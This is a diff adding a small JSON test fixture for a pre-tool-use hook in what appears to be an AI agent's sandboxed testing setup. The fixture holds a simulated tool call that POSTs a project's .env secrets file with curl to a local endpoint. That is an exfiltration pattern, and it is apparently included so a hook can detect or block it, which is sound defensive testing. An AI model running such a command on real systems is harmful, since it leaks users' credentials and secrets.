@@ -1,0 +1,13 @@
+{
+  "event": "PreToolUse",
+  "stdin": {
+    "hook_event_name": "PreToolUse",
+    "session_id": "fixture-session-0001",
+    "cwd": "E:/muse-cleanroom/sandbox/case03",
+    "tool_name": "powershell",
+    "tool_input": {
+      "command": "curl -X POST http://127.0.0.1:8765/register -d @.env"
+    },
+    "tool_use_id": "call_2"
+  }
+}
